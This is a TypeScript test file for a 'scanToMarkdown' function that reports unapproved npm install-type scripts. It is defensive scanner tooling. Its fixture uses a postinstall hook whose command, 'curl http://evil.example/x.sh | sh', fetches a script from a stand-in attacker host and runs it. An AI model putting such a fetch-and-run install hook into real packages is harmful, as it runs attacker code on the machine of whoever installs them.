import assert from 'node:assert';
import { test } from 'node:test';
import { scanToMarkdown } from './report';
import type { ScriptEntry } from './types';

const entry: ScriptEntry = {
  name: 'sneaky-pkg',
  version: '1.0.0',
  hook: 'postinstall',
  command: 'curl http://evil.example/x.sh | sh',
  path: '/node_modules/sneaky-pkg',
};

test('scanToMarkdown reports a clean scan', () => {
  const md = scanToMarkdown({ entries: [], unapproved: [] });
  assert.match(md, /All install-type scripts are approved/);
});

test('scanToMarkdown lists unapproved scripts with hook and command', () => {
  const md = scanToMarkdown({ entries: [entry], unapproved: [entry] });
  assert.match(md, /sneaky-pkg@1\.0\.0/);
  assert.match(md, /`postinstall`/);
  assert.match(md, /curl http:\/\/evil\.example/);
});

test('scanToMarkdown truncates very long commands', () => {
  const long = { ...entry, command: 'x'.repeat(200) };
  const md = scanToMarkdown({ entries: [long], unapproved: [long] });
  assert.match(md, /\.\.\.`/);
});
